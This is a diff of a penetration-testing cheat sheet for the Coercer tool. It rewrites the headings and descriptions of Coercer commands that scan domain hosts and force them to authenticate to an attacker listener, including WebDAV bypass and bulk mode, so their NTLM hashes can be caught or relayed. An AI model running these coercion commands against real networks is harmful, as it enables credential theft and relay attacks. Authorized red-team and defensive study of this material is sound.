@@ -25,9 +25,9 @@ fi
 
 ### scan
 
-Enumerate which coercion RPC functions the target responds to (no actual coercion). Read-only recon.
+Trigger scan with Coercer.
 
-```sh title:"Scan target for vulnerable coercion RPC methods"
+```sh title:"Coercer Trigger Scan"
 coercer scan -d $domain -u $user $auth_flags -t $rhost_ip
 ```
 <!-- cheat
@@ -38,9 +38,9 @@ import coercer_auth
 
 ### coerce to listener
 
-Force the target to authenticate to your listener IP. Pair with `ntlmrelayx` or `Responder` on `$lhost` to catch or relay the hash.
+Trigger Coercer to listener.
 
-```sh title:"Coerce target NTLM auth to attacker listener IP"
+```sh title:"Coercer Trigger to Listener"
 coercer coerce -d $domain -u $user $auth_flags -t $rhost_ip -l $lhost
 ```
 <!-- cheat
@@ -54,7 +54,9 @@ import coercer_auth
 
 Use a WebDAV/UNC hostname instead of IP - forces Kerberos-style auth that survives `-RestrictNTLM` lockdowns and bypasses NTLM mitigations. Hostname must resolve to your listener (often via Responder spoofing).
 
-```sh title:"Coerce via WebDAV hostname for Kerberos relay scenarios"
+Trigger via WebDAV hostname with Coercer.
+
+```sh title:"Coercer Trigger Via WebDAV Hostname"
 coercer coerce -d $domain -u $user $auth_flags -t $rhost_ip --webdav-host $listener_hostname
 ```
 <!-- cheat
@@ -66,9 +68,9 @@ var listener_hostname
 
 ### bulk coerce from file
 
-Coerce a list of targets from file. Useful when you want to mass-coerce all DCs/computers and harvest hashes.
+Trigger bulk coerce from file with Coercer.
 
-```sh title:"Bulk coerce every target in a file to attacker listener"
+```sh title:"Coercer Trigger Bulk Coerce from File"
 coercer coerce -d $domain -u $user $auth_flags --targets-file $targets_file -l $lhost
 ```
 <!-- cheat
